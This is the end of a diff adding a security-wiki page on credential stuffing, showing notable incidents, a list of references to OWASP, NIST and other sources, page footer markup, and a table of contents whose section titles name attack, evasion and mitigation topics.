+<li><strong>DraftKings (Nov 2022):</strong> ~68,000 sports betting accounts compromised, ~$300,000 drained from linked bank accounts. <a href="https://www.bleepingcomputer.com/news/security/hackers-steal-300-000-in-draftkings-credential-stuffing-attack/" target="_blank" rel="noreferrer noopener nofollow">BleepingComputer</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><strong>HackerOne (Oct 2020):</strong> Attack detected 5 days late during a weekly log audit — highlighted MFA enforcement gaps even on security-focused platforms. <a href="https://hackerone.com/reports/1007689" target="_blank" rel="noreferrer noopener nofollow">HackerOne Report #1007689</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener nofollow">OWASP: Credential Stuffing Prevention Cheat Sheet</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://pages.nist.gov/800-63-3/sp800-63b.html" target="_blank" rel="noreferrer noopener nofollow">NIST SP 800-63B: Breached Password Guidance</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://www.ic3.gov/Media/News/2022/220818.pdf" target="_blank" rel="noreferrer noopener nofollow">FBI PIN: Residential Proxies in Credential Stuffing (2022)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://haveibeenpwned.com/API/v3#PwnedPasswords" target="_blank" rel="noreferrer noopener nofollow">Have I Been Pwned: Pwned Passwords API (k-Anonymity Model)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://www.f5.com/glossary/credential-stuffing-attack" target="_blank" rel="noreferrer noopener nofollow">F5: 2024 Credential Stuffing Report</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://www.cloudflare.com/learning/bots/what-is-credential-stuffing/" target="_blank" rel="noreferrer noopener nofollow">Cloudflare: Understanding Credential Stuffing Attacks</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/authentication-mechanisms/credential-stuffing" target="_blank" rel="noreferrer noopener nofollow">PortSwigger: Credential Stuffing Testing Workflow</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://en.wikipedia.org/wiki/Credential_stuffing" target="_blank" rel="noreferrer noopener nofollow">Wikipedia: Credential Stuffing — Incident Timeline</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Credential%20Stuffing.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#credential-stuffing">Credential Stuffing</a>
+      <ul>
+        <li><a href="#understanding-credential-stuffing-basics">Understanding Credential Stuffing Basics</a>
+          <ul>
+            <li><a href="#the-stuffing-workflow">The Stuffing Workflow</a></li>
+            <li><a href="#credential-stuffing-vs-brute-force">Credential Stuffing vs. Brute Force</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surface">Attack Surface</a></li>
+        <li><a href="#exploiting-credential-stuffing">Exploiting Credential Stuffing</a>
+          <ul>
+            <li><a href="#1-account-takeover-ato">1. Account Takeover (ATO)</a></li>
+            <li><a href="#2-account--user-enumeration">2. Account / User Enumeration</a></li>
+            <li><a href="#3-mfa-prompt-bombing-mfa-fatigue">3. MFA Prompt Bombing (MFA Fatigue)</a></li>
+            <li><a href="#4-graphql-batching">4. GraphQL Batching</a></li>
+            <li><a href="#5-legacy--mobile-api-endpoint-discovery">5. Legacy / Mobile API Endpoint Discovery</a></li>
+            <li><a href="#6-sso-pivot">6. SSO Pivot</a></li>
+            <li><a href="#test-cases">Test Cases</a></li>
+          </ul>
+        </li>
+        <li><a href="#bypassing-defences">Bypassing Defences</a>
+          <ul>
+            <li><a href="#1-ip-rotation-via-residential-proxies">1. IP Rotation via Residential Proxies</a></li>
+            <li><a href="#2-request-jitter">2. Request Jitter</a></li>
+            <li><a href="#3-header-spoofing">3. Header Spoofing</a></li>
+            <li><a href="#4-captcha-bypass">4. CAPTCHA Bypass</a></li>
+            <li><a href="#5-tls--behavioral-fingerprint-evasion">5. TLS &amp; Behavioral Fingerprint Evasion</a></li>
+          </ul>
+        </li>
+        <li><a href="#detection-techniques-offensive-perspective">Detection Techniques (Offensive Perspective)</a>
+          <ul>
+            <li><a href="#manual-detection--confirming-a-hit">Manual Detection — Confirming a Hit</a></li>
+            <li><a href="#automated-detection">Automated Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#mitigation--prevention">Mitigation &amp; Prevention</a></li>
+        <li><a href="#good-to-read">Good To Read</a>
+          <ul>
+            <li><a href="#notable-incidents">Notable Incidents</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
